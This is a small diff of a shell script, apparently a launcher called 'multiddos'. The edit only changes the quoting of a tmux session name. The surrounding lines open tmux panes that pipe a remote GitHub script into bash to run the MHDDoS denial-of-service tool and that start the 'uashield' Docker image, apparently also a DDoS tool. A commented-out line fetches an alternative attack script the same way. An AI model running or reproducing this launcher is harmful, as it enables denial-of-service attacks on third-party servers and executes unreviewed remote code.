@@ -15,7 +15,7 @@ if [ ! -f "/usr/local/bin/gotop" ]; then
 fi
 rm *.tar.gz *.deb
 
-tmux new-session -s "multiddos" -d 'gotop -asc solarized'
+tmux new-session -s multiddos -d 'gotop -asc solarized'
 tmux split-window -h -p 75 'curl -s https://raw.githubusercontent.com/KarboDuck/mhddos_bash/master/runner.sh | bash'
 #tmux split-window -h -p 75 'curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/bash/auto_bash.sh |  bash'
 tmux split-window -v 'docker run -it --rm  ghcr.io/opengs/uashield:master 512 true'
